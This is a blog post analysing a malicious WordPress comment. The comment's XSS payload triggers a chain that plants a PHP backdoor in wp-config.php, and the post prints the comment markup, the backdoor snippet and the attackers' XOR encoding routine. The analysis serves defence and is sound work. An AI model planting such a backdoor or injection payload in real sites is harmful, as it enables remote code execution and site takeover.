---
layout: post
title: Exploring malicious wordpress comment spam
tags:
 - wordpress
 - security
 - code
 - analysis
 - encryption
---

I found an interesting piece of WordPress malware. In this post, I'll dig into the nitty-gritty of
how it works.

<!--more-->

**DISCLAIMER:** The contents of this post may contain code that is unsafe to run. The
purpose of this post is purely exploratory and meant for defensive purposes, and not as an intro to
1337 hax0ring. If you use the knowledge below for bad, don't blame me when the feds' party van comes
for you. Your actions are your own.

*Last updated on 2014-01-07 17:25 CST*

### Introduction ###

I manage a few WordPress websites in my spare time. Most of the sites don't have comments enabled,
but a few do, so on occasion I'll be alerted to new comments. The majority of those comments are
spam (usually having something to do with advertising SEO opportunities) and thus are left in the
purgatory of the moderation queue. However, one would-be comment was different from the usual
fake-SEO tripe. This post will examine this particular comment and explore its malicious properties.

*Tl;dr? see the summary at the bottom of this post.*

### The raw comment ###

This is the email notification I received when the comment was created. It includes the relevant
metadata as well as the raw comment itself:

{% highlight text %}
A new comment on the post "Post" is waiting for your approval
POST-URL

Author : Wasia (IP: 50.63.194.123 , p3nlhg1391.shr.prod.phx3.secureserver.net)
E-mail : aaa@aaa.com
URL    :
Whois  : http://whois.arin.net/rest/ip/50.63.194.123
Comment:
Welcome to WordPress. This is your first post. [<a title="]" rel="nofollow"></a>[\" <!--
style=\'position:fixed;top:0px;left:0px;width:6000px;height:6000px;color:transparent;z-index:999999999\'
onmouseover="eval(atob(\'naughty-javascript-in-base-64-goes-here'))" &gt; --><a></a>] Edit or delete it, then start blogging!

Approve it: APPROVE-URL
Trash it: TRASH-URL
Spam it: SPAM-URL
Currently 100 comments are waiting for approval. Please visit the moderation panel:
PANEL-URL

{% endhighlight %}

The comment appears to be setup to force anyone who visits the page it inhabits to run some
obfuscated javascript (the large chunk of characters within the <code>eval(atob())</code> ).

### De-obfuscating the comment's JavaScript ###
De-obfuscation of the javascript is accomplished by decoding the block of characters inside of the
atob() function call from base-64. It's now clear that this script is trying to create an iframe on
the page and fill it with the wordpress installation's plugin editor in order to edit the
<code>hello.php</code> plugin. If the desired changes have already been made, then it will instead
set the iframe to run the modified <code>hello.php</code> script.

But what are those changes? I found the answer by decoding a base-64 string that was being added (in
decoded form) to <code>hello.php</code>. It turned out to be a chunk of PHP that serves to exploit
incorrect file permission settings to allow for arbitrary remote code execution. 

### Overview of the modifications to hello.php ###

The main target of the attack appears to be <code>wp-config.php</code>, a file that holds important
settings for WordPress sites (like database access credentials). The script injects some code into
<code>wp-config.php</code> (reproduced in a more readable form below):

#### Injection into wp-config.php ####
{% highlight php linenos=table %}
<?php
if (isset($_REQUEST['FILE'])){
    $_FILE = $_REQUEST['unique-value-here']('$_',$_REQUEST['FILE'].'($_);');
    $_FILE(stripslashes($_REQUEST['HOST']));
}
?>
{% endhighlight %}

It appears that by adding this code the attacker can execute arbitrary code contained in a
specially-crafted request to <code>wp-config.php</code>. Specifically, any request with the 'FILE'
variable set will execute the code supplied by the request variable with the same name as a unique
ID generated previously in the script. This provides the attacker with the ability to limit access
to this exploit. 

Next, the script moves to correct the permissions of <code>wp-config.php</code> in order to prevent
other attackers from gaining control (a consistent theme in this script, as will be shown below).
Another consistent theme of this attack is the clever hiding of modified files' modification dates.
This ensures that a simple directory listing doesn't give away that the exploit has occurred. 

#### Phoning home: report() ####

In order for the attacker to make use of the now-compromised site, it is necessary for them to
obtain the unique ID in the script. The <code>report()</code> function sends that and the WordPress
installation's host to a hardcoded list of sites. The reporting action is accomplished via a series
of HTTP GET requests containing this information as a URL parameter.

#### Basic encryption: Uno_encode() ####

{% highlight php %}
<?php
function Uno_encode($String)
{
    $Salt='dc5p9dOpBc';
    $StrLen = strlen($String);
    $Seq = 'DMEf5HZuPq';
    $Gamma = '';
    while (strlen($Gamma)<$StrLen)
    {
        $Seq = pack("H*",sha1($Gamma.$Seq.$Salt));
        $Gamma.=substr($Seq,0,8);
    }

    return base64_encode($String^$Gamma);
}
?>
{% endhighlight %}

The data reported back to the attackers is first encrypted by the <code>Uno_encode()</code>
function. It's notable because it doesn't use a standard cryptosystem (like AES or RSA);
instead, it takes a much simpler approach by creating a sort of static key and then XORing it with
the string to be encrypted. Decryption can be accomplished by sending the base-64 decoded ciphertext
through the same function, like this:

{% highlight php %}
<?php
function Uno_decode($String)
{
    return base64_decode(Uno_encode(base64_decode($String)));
}
?>
{% endhighlight %}

Of course, this requires that you know the values for <code>$Salt</code> and <code>$Seq</code> (as
well as the rest of the algorithm), so it's reasonably secure as long as those secrets aren't known.
Unfortunately for the attackers, now they *are* known, and they now wish they had chosen an asymmetric
algorithm instead (since exposing a public key wouldn't have also exposed their communications).

#### Self-patching and self-removal ####

After modifying <code>wp-config.php</code> and reporting back, the script takes steps to hide its
tracks and secure the injected code's place in the WordPress installation. First, it removes the
original malicious comment from the MySQL database. Next, it patches the WordPress installation by
modifying the <code>wp-comments-post.php</code> file to completely block the posting of new
comments. It's definitely a sledgehammer approach to fixing the vulnerability used in this exploit,
but it works as long as no one gets curious as to why new comments can't be posted. Finally, the
script removes itself from <code>hello.php</code>. It uses an MD5 hash value at the bottom of the script
as a boundary marker to indicate where the malicious script ends and the original content begins. 

### Summary ###

This exploit originates as a comment designed to look like the default WordPress post. The first
time it's viewed it runs some JavaScript which adds the PHP previously described to a plugin,
<code>hello.php</code>. The second time the comment is viewed it executes the plugin, in turn
running code that

 1. injects more PHP into the WordPress installation's settings file, <code>wp-config.php</code>,
 2. sends information back to the attackers (allowing them to execute
arbitrary code with a specially-crafted request using the injected code from 1.),
 3. removes the comment, and
 4. removes the malicious code added to <code>hello.php</code>.

#### Requirements for vulnerability ####

Now that I've gone through the exploit I think I can speculate as to what it would take for a
WordPress site to be vulnerable to it. It seems to require the following to be true:

 1. Commenting must be enabled
 2. Commenting must be open to everyone
 3. Comments must be automatically approved (no moderation queue)
 4. The web server (or whatever entity is running WordPress) must be able to write to the WordPress
    installation directory

Number 4 is the big one, since many folks installing WordPress themselves can make the easy mistake
of using incorrect file system permissions.


### Final thoughts ###

Something that struck me as odd was that there wasn't an immediate attempt to exfiltrate the
database access credentials. Wouldn't a list of valid credentials be valuable?

### BONUS -- A CONNECTION TO ANOTHER EXPLOIT?! ###

I got curious about the MD5 hash (<code>49de371511c1de3bde34b0108ec7f129</code>) at the bottom of
the PHP code that gets added to <code>hello.php</code> and did some googling. [This
guy](https://www.planetspork.com/w/2014/11/this-seems-interesting/) had someone try to use
shellshock to add some PHP to his site, and as part of the PHP's access control it compares the MD5
of the requesting browser's user agent to the MD5 hash value listed at the bottom of the PHP in this exploit.
It seems that the same entity might be responsible for both exploits.

### References / Resources Used ###
 * [Base-64 decoder](https://www.base64decode.org/) to decode the base-64 strings
 * [w3schools](http://www.w3schools.com/jsref/met_win_atob.asp) to brush up on basic JavaScript
 * [The PHP Manual](http://php.net/manual/en/index.php) for a refresher on common PHP functions
 * The \#crypto channel on the [Freenode IRC network](http://freenode.net/)
